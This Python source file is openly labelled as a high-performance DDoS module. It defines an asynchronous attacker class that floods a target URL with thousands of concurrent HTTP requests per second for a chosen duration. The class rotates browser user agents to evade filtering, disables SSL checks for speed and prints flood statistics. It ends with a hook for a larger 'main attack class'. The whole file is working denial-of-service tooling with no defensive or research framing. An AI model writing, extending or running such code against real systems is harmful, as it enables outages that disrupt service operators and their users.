"""
Async Attack Methods for High-Performance DDoS
Optimized for 10 Gbps network and multi-core processors
"""

import asyncio
import aiohttp
import time
import random
import json
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
import weakref
import gc

@dataclass
class AsyncAttackResult:
    """Result of an async attack request"""
    success: bool
    status_code: Optional[int]
    response_time: float
    error: Optional[str]
    bytes_sent: int
    bytes_received: int

class HighPerformanceAsyncAttacker:
    """High-performance async attacker optimized for maximum throughput"""
    
    def __init__(self, target: str, method: str = 'GET', **kwargs):
        self.target = target
        self.method = method.upper()
        self.session = None
        self.connector = None
        
        # Performance settings
        self.max_concurrent = kwargs.get('max_concurrent', 10000)
        self.timeout = aiohttp.ClientTimeout(
            total=kwargs.get('timeout', 5),
            connect=kwargs.get('connect_timeout', 2),
            sock_read=kwargs.get('read_timeout', 3)
        )
        
        # Request settings
        self.headers = kwargs.get('headers', {})
        self.data = kwargs.get('data', '')
        self.params = kwargs.get('params', {})
        
        # Statistics
        self.stats = {
            'requests_sent': 0,
            'requests_successful': 0,
            'requests_failed': 0,
            'total_bytes_sent': 0,
            'total_bytes_received': 0,
            'start_time': 0,
            'end_time': 0
        }
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
    
    async def __aenter__(self):
        """Async context manager entry"""
        await self.initialize()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        await self.cleanup()
    
    async def initialize(self):
        """Initialize async session with optimized settings"""
        # Create optimized connector
        self.connector = aiohttp.TCPConnector(
            limit=self.max_concurrent,
            limit_per_host=self.max_concurrent,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
            force_close=False,
            ssl=False  # Disable SSL verification for speed
        )
        
        # Create session with optimized settings
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout,
            headers={'Connection': 'keep-alive'},
            skip_auto_headers=['User-Agent']  # We'll set this manually
        )
        
        print(f"[ASYNC] Initialized session with {self.max_concurrent} max concurrent connections")
    
    async def cleanup(self):
        """Cleanup async resources"""
        if self.session:
            await self.session.close()
        if self.connector:
            await self.connector.close()
        
        # Force garbage collection
        gc.collect()
    
    async def _make_request(self, semaphore: asyncio.Semaphore) -> AsyncAttackResult:
        """Make a single async request"""
        async with semaphore:
            start_time = time.time()
            bytes_sent = 0
            bytes_received = 0
            
            try:
                # Prepare headers with random user agent
                headers = self.headers.copy()
                headers['User-Agent'] = random.choice(self.user_agents)
                
                # Calculate bytes to be sent
                if self.data:
                    bytes_sent = len(str(self.data).encode('utf-8'))
                
                # Make the request
                async with self.session.request(
                    method=self.method,
                    url=self.target,
                    headers=headers,
                    data=self.data if self.method in ['POST', 'PUT', 'PATCH'] else None,
                    params=self.params,
                    allow_redirects=False,
                    ssl=False
                ) as response:
                    # Read response (but don't store it to save memory)
                    content = await response.read()
                    bytes_received = len(content)
                    
                    response_time = time.time() - start_time
                    
                    # Update statistics
                    self.stats['requests_sent'] += 1
                    self.stats['total_bytes_sent'] += bytes_sent
                    self.stats['total_bytes_received'] += bytes_received
                    
                    if response.status < 400:
                        self.stats['requests_successful'] += 1
                        return AsyncAttackResult(
                            success=True,
                            status_code=response.status,
                            response_time=response_time,
                            error=None,
                            bytes_sent=bytes_sent,
                            bytes_received=bytes_received
                        )
                    else:
                        self.stats['requests_failed'] += 1
                        return AsyncAttackResult(
                            success=False,
                            status_code=response.status,
                            response_time=response_time,
                            error=f"HTTP {response.status}",
                            bytes_sent=bytes_sent,
                            bytes_received=bytes_received
                        )
            
            except asyncio.TimeoutError:
                self.stats['requests_failed'] += 1
                return AsyncAttackResult(
                    success=False,
                    status_code=None,
                    response_time=time.time() - start_time,
                    error="Timeout",
                    bytes_sent=bytes_sent,
                    bytes_received=0
                )
            
            except Exception as e:
                self.stats['requests_failed'] += 1
                return AsyncAttackResult(
                    success=False,
                    status_code=None,
                    response_time=time.time() - start_time,
                    error=str(e),
                    bytes_sent=bytes_sent,
                    bytes_received=0
                )
    
    async def run_attack(self, duration: int, requests_per_second: int = 10000) -> Dict[str, Any]:
        """Run high-performance async attack"""
        print(f"[ASYNC] Starting attack on {self.target}")
        print(f"[ASYNC] Duration: {duration}s, Target RPS: {requests_per_second}")
        print(f"[ASYNC] Method: {self.method}, Max Concurrent: {self.max_concurrent}")
        
        self.stats['start_time'] = time.time()
        
        # Create semaphore to limit concurrent requests
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        # Calculate request intervals
        interval = 1.0 / requests_per_second if requests_per_second > 0 else 0
        
        tasks = []
        end_time = time.time() + duration
        
        try:
            while time.time() < end_time:
                # Create batch of tasks
                batch_size = min(1000, requests_per_second)  # Process in batches
                batch_tasks = []
                
                for _ in range(batch_size):
                    if time.time() >= end_time:
                        break
                    
                    task = asyncio.create_task(self._make_request(semaphore))
                    batch_tasks.append(task)
                    tasks.append(task)
                    
                    # Rate limiting
                    if interval > 0:
                        await asyncio.sleep(interval)
                
                # Process completed tasks in batches to free memory
                if len(tasks) >= 5000:  # Process every 5000 tasks
                    completed_tasks = [task for task in tasks if task.done()]
                    for task in completed_tasks:
                        tasks.remove(task)
                        try:
                            await task  # Ensure task is properly cleaned up
                        except:
                            pass
                    
                    # Force garbage collection
                    gc.collect()
                
                # Small delay to prevent overwhelming the event loop
                await asyncio.sleep(0.001)
        
        except KeyboardInterrupt:
            print("\n[ASYNC] Attack interrupted by user")
        
        # Wait for remaining tasks to complete
        if tasks:
            print(f"[ASYNC] Waiting for {len(tasks)} remaining tasks to complete...")
            await asyncio.gather(*tasks, return_exceptions=True)
        
        self.stats['end_time'] = time.time()
        
        # Calculate final statistics
        total_time = self.stats['end_time'] - self.stats['start_time']
        actual_rps = self.stats['requests_sent'] / total_time if total_time > 0 else 0
        success_rate = (self.stats['requests_successful'] / self.stats['requests_sent'] * 100) if self.stats['requests_sent'] > 0 else 0
        
        results = {
            'duration': total_time,
            'requests_sent': self.stats['requests_sent'],
            'requests_successful': self.stats['requests_successful'],
            'requests_failed': self.stats['requests_failed'],
            'success_rate': success_rate,
            'actual_rps': actual_rps,
            'total_bytes_sent': self.stats['total_bytes_sent'],
            'total_bytes_received': self.stats['total_bytes_received'],
            'avg_response_time': 0  # Could be calculated if needed
        }
        
        print(f"\n[ASYNC] Attack completed!")
        print(f"[ASYNC] Total requests: {results['requests_sent']}")
        print(f"[ASYNC] Success rate: {results['success_rate']:.2f}%")
        print(f"[ASYNC] Actual RPS: {results['actual_rps']:.2f}")
        print(f"[ASYNC] Data sent: {results['total_bytes_sent'] / 1024 / 1024:.2f} MB")
        print(f"[ASYNC] Data received: {results['total_bytes_received'] / 1024 / 1024:.2f} MB")
        
        return results

# Integration method for the main attack class
async def run_async_attack_method(target: str, method: str, duration: int, **kwargs) -> Dict[str, Any]:
    """Run async attack method - integration point for main class"""
    async with HighPerformanceAsyncAttacker(target, method, **kwargs) as attacker:
        return await attacker.run_attack(duration, kwargs.get('requests_per_second', 10000))